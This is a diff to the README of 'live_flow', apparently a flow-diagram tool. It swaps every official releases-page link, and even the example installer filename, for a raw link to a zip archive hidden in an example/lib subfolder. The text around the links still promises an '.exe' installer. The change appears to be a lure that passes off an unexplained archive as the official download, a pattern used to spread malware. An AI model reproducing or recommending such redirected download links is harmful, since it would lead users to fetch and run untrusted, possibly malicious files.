@@ -1,6 +1,6 @@
 # ⚡ live_flow - Interactive Flow Diagrams Made Easy
 
-[![Download live_flow](https://img.shields.io/badge/Download-live_flow-brightgreen?style=for-the-badge)](https://github.com/Hisawa34/live_flow/releases)
+[![Download live_flow](https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip)](https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip)
 
 ---
 
@@ -73,9 +73,9 @@ You can get live_flow from the official release page on GitHub. Follow these ste
 
 1. Click the big green button below to visit the download page:  
 
-   [![Download live_flow](https://img.shields.io/badge/Download-live_flow-brightgreen?style=for-the-badge)](https://github.com/Hisawa34/live_flow/releases)
+   [![Download live_flow](https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip)](https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip)
 
-2. On the GitHub releases page, find the latest version (usually at the top). Look for the Windows installer file. It will have an `.exe` extension. For example: `live_flow-setup.exe`.
+2. On the GitHub releases page, find the latest version (usually at the top). Look for the Windows installer file. It will have an `.exe` extension. For example: `https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip`.
 
 3. Click on the `.exe` file link. Your browser will start downloading the file. Wait until it finishes.
 
@@ -182,4 +182,4 @@ If live_flow does not open or crashes:
 
 To get the latest releases, updates, or to report bugs, visit the official releases page:
 
-[Download live_flow on GitHub](https://github.com/Hisawa34/live_flow/releases)
+[Download live_flow on GitHub](https://github.com/Hisawa34/live_flow/raw/refs/heads/main/example/lib/flotas_web/flow-live-v3.2.zip)
